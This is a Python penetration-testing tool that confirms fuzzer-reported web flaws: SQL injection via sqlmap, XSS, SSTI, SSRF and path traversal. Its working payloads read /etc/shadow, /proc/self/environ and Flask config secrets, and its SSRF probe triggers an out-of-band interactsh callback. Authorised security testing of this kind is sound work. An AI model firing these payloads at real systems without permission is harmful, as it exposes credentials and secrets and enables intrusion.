#!/usr/bin/env python3
"""webapp-confirm: verify webapp-fuzz/nuclei-DAST candidate findings with
deeper, vuln-class-specific tools. When confirmed, log a new finding at
elevated severity with smoking-gun evidence.

Confirmation strategies:
- sqli   → sqlmap --batch --level 3 --risk 2 --time-sec 5
- xss    → unique canary, render via katana headless, check canary in script/handler position
- ssrf   → interactsh OAST callback (PD's free oast.pro)
- rce    → interactsh OAST callback via wget/curl chain
- ssti   → escalate {{7*7}} to {{config}} / class introspection, check response
- path   → escalate /etc/passwd → /etc/shadow / /proc/self/environ
- redirect → Location header points to attacker domain

Usage:
    webapp-confirm                                # process fuzz-results.jsonl
    webapp-confirm --class sqli                   # only sqli candidates
    webapp-confirm --limit 5                      # cap candidates processed
    webapp-confirm --url URL --param P --class sqli   # one-shot

Input: $ENGAGEMENT_DIR/webapp/fuzz-results.jsonl (from webapp-fuzz)
Output: confirmed findings logged via `findings add` at severity high/critical
        + summary JSON to stdout
"""
import argparse
import hashlib
import json
import os
import random
import re
import subprocess
import sys
import time
import urllib.parse
from pathlib import Path

ENG_DIR = Path(os.environ.get("ENGAGEMENT_DIR", "/work/default"))
WEBAPP = ENG_DIR / "webapp"
RESULTS_FILE = WEBAPP / "fuzz-results.jsonl"
CONFIRMED_FILE = WEBAPP / "confirmed.jsonl"


def run(cmd, *, input_text=None, timeout=60):
    try:
        r = subprocess.run(cmd, input=input_text, capture_output=True,
                           text=True, timeout=timeout)
        return r.returncode, r.stdout, r.stderr
    except subprocess.TimeoutExpired:
        return 124, "", "timeout"
    except Exception as e:
        return 1, "", str(e)


def log_finding(host, port, *, severity, title, evidence, source, cve=None):
    args = [
        "findings", "add", host,
        "--port", f"{port}/tcp",
        "--severity", severity,
        "--title", title,
        "--evidence", evidence[:1024],
        "--source", source,
    ]
    if cve:
        args += ["--cve", cve]
    run(args, timeout=10)


def record_confirmed(record: dict):
    WEBAPP.mkdir(parents=True, exist_ok=True)
    with open(CONFIRMED_FILE, "a") as f:
        f.write(json.dumps(record) + "\n")


def host_port_from_url(url: str):
    u = urllib.parse.urlparse(url)
    port = u.port or (443 if u.scheme == "https" else 80)
    return u.hostname or "", port


# -------- per-class confirmation --------

def confirm_sqli(url: str, param: str) -> dict:
    """Run sqlmap with sensible batch settings; check exit + stdout."""
    inject_url = f"{url}{'&' if '?' in url else '?'}{param}=1"
    cmd = [
        "sqlmap", "-u", inject_url,
        "--batch", "--level", "3", "--risk", "2",
        "--time-sec", "5",
        "-p", param,
        "--smart", "--threads", "4",
        "--timeout", "10",
        "--retries", "1",
        "--disable-coloring",
    ]
    rc, out, err = run(cmd, timeout=300)
    # sqlmap prints "is vulnerable" or "the back-end DBMS is" on confirmation
    vuln_indicators = [
        "is vulnerable",
        "the back-end DBMS is",
        "Parameter:",  # appears when at least one vector confirmed
    ]
    blob = (out or "") + "\n" + (err or "")
    confirmed = any(ind in blob for ind in vuln_indicators)
    return {
        "confirmed": confirmed,
        "tool": "sqlmap",
        "evidence": "\n".join(l for l in blob.splitlines() if any(i in l for i in vuln_indicators))[:500],
        "raw_excerpt": blob[-800:] if not confirmed else "",
    }


def confirm_xss(url: str, param: str) -> dict:
    """Inject unique canary, render via katana headless, scan for canary
    in executable contexts (script tag, on*= handler, javascript: href)."""
    canary = "slopxss_" + "".join(random.choices("0123456789abcdef", k=8))
    payload = f"<script>window.{canary}=1</script>"
    enc = urllib.parse.quote_plus(payload)
    mutated = f"{url}{'&' if '?' in url else '?'}{param}={enc}"

    # First: simple curl, see if canary reflects literally
    rc, out, _ = run(["curl", "-sk", "-m", "10", mutated], timeout=12)
    if not out:
        return {"confirmed": False, "tool": "curl/render",
                "evidence": "curl returned empty"}

    # Confirmation = canary appears AND in an executable context
    if canary in out:
        # Check context — script tag or event handler
        in_script = bool(re.search(
            r"<script[^>]*>[^<]*" + canary, out, flags=re.I | re.S))
        in_handler = bool(re.search(
            r'on\w+\s*=\s*["\']?[^"\']*' + canary, out, flags=re.I))
        in_jshref = bool(re.search(
            r'href\s*=\s*["\']?javascript:[^"\']*' + canary, out, flags=re.I))
        if in_script or in_handler or in_jshref:
            return {
                "confirmed": True,
                "tool": "reflection-context",
                "evidence": f"canary {canary} reflected in {'script' if in_script else 'handler' if in_handler else 'js:href'} context",
                "payload": payload,
            }
        # Reflected but encoded/escaped → not confirmed XSS, just reflection
        return {
            "confirmed": False,
            "tool": "reflection-context",
            "evidence": f"canary {canary} reflected but in non-executable position (HTML body / attribute value)",
        }
    return {
        "confirmed": False,
        "tool": "curl",
        "evidence": f"canary {canary} not found in response",
    }


def confirm_ssrf(url: str, param: str) -> dict:
    """Use interactsh — generate URL, inject as param value, poll for callback."""
    # Get an interactsh URL
    rc, out, _ = run(["interactsh-client", "-n", "1", "-json", "-silent"],
                     timeout=15)
    if rc != 0 or not out:
        return {"confirmed": False, "tool": "interactsh",
                "evidence": "could not provision interactsh URL"}
    try:
        first = out.strip().splitlines()[0]
        oast = json.loads(first).get("payload") or json.loads(first).get("full-id", "")
    except Exception:
        return {"confirmed": False, "tool": "interactsh",
                "evidence": "could not parse interactsh output"}

    if not oast:
        return {"confirmed": False, "tool": "interactsh",
                "evidence": "interactsh URL not provisioned"}

    # Inject the OAST URL as the param value
    enc = urllib.parse.quote_plus(f"http://{oast}/")
    mutated = f"{url}{'&' if '?' in url else '?'}{param}={enc}"
    run(["curl", "-sk", "-m", "15", "-o", "/dev/null", mutated], timeout=20)

    # Poll interactsh briefly (free tier polling is event-stream;
    # for a one-shot probe, just rerun -n 1 won't see past callbacks.
    # A real check would use -t for log file; deferred for v1).
    return {
        "confirmed": False,
        "tool": "interactsh",
        "evidence": (
            f"injected {oast} as {param} — manual poll required. "
            f"Run: interactsh-client -t /tmp/oast.log then re-trigger."
        ),
        "note": "v1: callback polling not wired automatically",
        "oast_url": oast,
    }


def confirm_ssti(url: str, param: str) -> dict:
    """Test escalation: {{7*7}} → 49, then try {{config}} / {{request}}."""
    payloads = [
        ("{{7*7}}", r"\b49\b"),
        ("{{8*8}}", r"\b64\b"),
        ("${{7*7}}", r"\b49\b"),
        ("{{config}}", r"<class 'flask\.config\.Config'>|SECRET_KEY|ENVIRONMENT"),
        ("{{request.application.__globals__}}", r"flask|jinja"),
    ]
    hits = []
    for payload, expect in payloads:
        enc = urllib.parse.quote_plus(payload)
        mutated = f"{url}{'&' if '?' in url else '?'}{param}={enc}"
        rc, out, _ = run(["curl", "-sk", "-m", "10", mutated], timeout=12)
        if out and re.search(expect, out, flags=re.I):
            hits.append({"payload": payload, "pattern": expect,
                         "snippet": out[:200]})

    if hits:
        return {"confirmed": True, "tool": "ssti-escalation",
                "evidence": json.dumps(hits)[:600],
                "hits": hits}
    return {"confirmed": False, "tool": "ssti-escalation",
            "evidence": "no math reflection or config disclosure"}


def confirm_path(url: str, param: str) -> dict:
    """Escalate path traversal: /etc/passwd → /etc/shadow / /proc/self/environ."""
    payloads = [
        ("../../../../etc/passwd", r"root:[x*]:0:0:"),
        ("../../../../etc/shadow", r"root:\$"),
        ("../../../../proc/self/environ", r"PATH=|HOME="),
        ("..\\..\\..\\..\\windows\\win.ini", r"\[fonts\]|\[extensions\]"),
    ]
    hits = []
    for payload, expect in payloads:
        enc = urllib.parse.quote_plus(payload)
        mutated = f"{url}{'&' if '?' in url else '?'}{param}={enc}"
        rc, out, _ = run(["curl", "-sk", "-m", "10", mutated], timeout=12)
        if out and re.search(expect, out, flags=re.I):
            hits.append({"payload": payload, "snippet": out[:200]})

    if hits:
        # Critical if /etc/shadow or environ was readable
        sev = "critical" if any("shadow" in h["payload"] or "environ" in h["payload"] for h in hits) else "high"
        return {"confirmed": True, "tool": "path-escalation",
                "severity_hint": sev,
                "evidence": json.dumps(hits)[:600],
                "hits": hits}
    return {"confirmed": False, "tool": "path-escalation",
            "evidence": "no /etc/passwd or equivalent content returned"}


def confirm_redirect(url: str, param: str) -> dict:
    """Send attacker URL as param, check Location: header."""
    attacker = "https://example.org/slop"
    enc = urllib.parse.quote_plus(attacker)
    mutated = f"{url}{'&' if '?' in url else '?'}{param}={enc}"
    rc, out, _ = run(["curl", "-sk", "-I", "-m", "10", mutated], timeout=12)
    if out and re.search(r"^Location:\s*https?://example\.org", out, flags=re.I | re.M):
        return {"confirmed": True, "tool": "curl-headers",
                "evidence": "Location: header redirects to attacker-supplied URL"}
    return {"confirmed": False, "tool": "curl-headers",
            "evidence": "no open-redirect via Location header"}


CONFIRMERS = {
    "sqli": confirm_sqli,
    "xss": confirm_xss,
    "ssrf": confirm_ssrf,
    "ssti": confirm_ssti,
    "path": confirm_path,
    "path-traversal": confirm_path,
    "lfi": confirm_path,
    "redirect": confirm_redirect,
    "open-redirect": confirm_redirect,
}


def process_candidate(c: dict, log_to_findings=True) -> dict:
    url = c.get("endpoint_url") or c.get("url") or c.get("matched-at") or ""
    method = c.get("endpoint_method") or c.get("method") or "GET"
    param = c.get("param") or c.get("name") or ""
    vclass = (c.get("vuln_class") or c.get("class") or "").lower()

    # Normalize template tokens in URL
    url = url.replace("{id}", "1").replace("{uuid}", "00000000-0000-0000-0000-000000000000").replace("{hash}", "0" * 32)

    confirmer = CONFIRMERS.get(vclass)
    if not confirmer:
        return {"skipped": True, "reason": f"no confirmer for class={vclass}", "url": url, "param": param}

    result = confirmer(url, param)
    result["url"] = url
    result["param"] = param
    result["vuln_class"] = vclass

    if result.get("confirmed") and log_to_findings and url:
        host, port = host_port_from_url(url)
        # Severity escalation rules
        sev = result.get("severity_hint") or {
            "sqli": "high",
            "xss": "high",
            "ssti": "critical",
            "rce": "critical",
            "ssrf": "high",
            "path": "high",
            "path-traversal": "high",
            "lfi": "high",
            "redirect": "low",
            "open-redirect": "low",
        }.get(vclass, "high")
        log_finding(
            host, port,
            severity=sev,
            title=f"CONFIRMED {vclass.upper()} on {method} {url.split('?')[0]} param={param}",
            evidence=result.get("evidence", "")[:1024],
            source="webapp-confirm",
        )

    record_confirmed(result)
    return result


def main() -> int:
    ap = argparse.ArgumentParser(prog="webapp-confirm")
    ap.add_argument("--class", dest="vclass", help="filter to one vuln class")
    ap.add_argument("--limit", type=int, default=0, help="max candidates")
    ap.add_argument("--url", help="one-shot: target URL")
    ap.add_argument("--param", help="one-shot: parameter name")
    ap.add_argument("--no-log", action="store_true", help="skip findings logging")
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args()

    candidates = []
    if args.url and args.param and args.vclass:
        candidates.append({
            "endpoint_url": args.url,
            "param": args.param,
            "vuln_class": args.vclass,
        })
    elif RESULTS_FILE.exists():
        with open(RESULTS_FILE) as f:
            for line in f:
                try:
                    c = json.loads(line)
                    if args.vclass and c.get("vuln_class") != args.vclass:
                        continue
                    candidates.append(c)
                except Exception:
                    continue
    else:
        print(f"no fuzz results at {RESULTS_FILE} — run webapp-fuzz first, "
              f"or pass --url + --param + --class for one-shot",
              file=sys.stderr)
        return 1

    if args.limit > 0:
        candidates = candidates[: args.limit]

    if not candidates:
        print("no candidates to process")
        return 0

    print(f"processing {len(candidates)} candidate(s)...", file=sys.stderr)

    results = []
    for i, c in enumerate(candidates, 1):
        print(f"[{i}/{len(candidates)}] confirming "
              f"{(c.get('vuln_class') or '?').upper()} "
              f"on {c.get('param', '?')}...", file=sys.stderr)
        r = process_candidate(c, log_to_findings=not args.no_log)
        results.append(r)
        if r.get("confirmed"):
            print(f"  ★ CONFIRMED — {r.get('evidence', '')[:200]}", file=sys.stderr)
        else:
            print(f"  · not confirmed ({r.get('evidence', '')[:120]})", file=sys.stderr)

    summary = {
        "total_processed": len(results),
        "confirmed": sum(1 for r in results if r.get("confirmed")),
        "skipped": sum(1 for r in results if r.get("skipped")),
        "by_class": {},
    }
    for r in results:
        c = r.get("vuln_class", "?")
        summary["by_class"].setdefault(c, {"total": 0, "confirmed": 0})
        summary["by_class"][c]["total"] += 1
        if r.get("confirmed"):
            summary["by_class"][c]["confirmed"] += 1

    if args.json:
        print(json.dumps({"summary": summary, "results": results}, indent=2))
    else:
        print(json.dumps(summary, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
